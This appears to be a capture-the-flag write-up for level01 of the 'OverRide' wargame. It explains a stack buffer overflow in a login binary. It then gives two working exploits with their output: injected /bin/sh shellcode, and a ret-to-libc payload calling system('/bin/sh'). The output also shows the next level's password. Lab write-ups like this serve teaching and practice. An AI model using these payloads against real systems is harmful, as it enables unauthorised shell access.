# level01
## Program behaviour

1. Ask for `username`
2. Test `username` equal to `dat_wil`
    - If not, `exit`
3. Ask for `password`
4. Print `"nope, incorrect password...\n"`;

## Vulnerability

The program asks for a `password` of maximum length `100`.
But the buffer only has a max capacity of `64`.
This is vunerable to buffer-overflow attacks.

## Exploitation

In both methods we overwrite the saved `$eip` at `$rbp+4` to jump after the `main` to the desired location.

### Method 1: Shellcode

Use the `password` buffer to inject a shellcode running `/bin/sh`

```sh
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "\x90"* 35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xbc\xd6\xff\xff"'; cat) | ~/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

### Method 2: Ret to libc

Overwrite `$rbp+4` (saved `$eip`) and `$rbp+12` to the function `system` and the string `/bin/sh` respectively.
The program upon exiting `main` will jump to `system` with `/bin/sh` as parameter.

```gdb
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) find 0xf7e6aed0, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

```sh
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "\x90" * 80 + "\xd0\xae\xe6\xf7DUDE\xec\x97\xf8\xf7"';cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```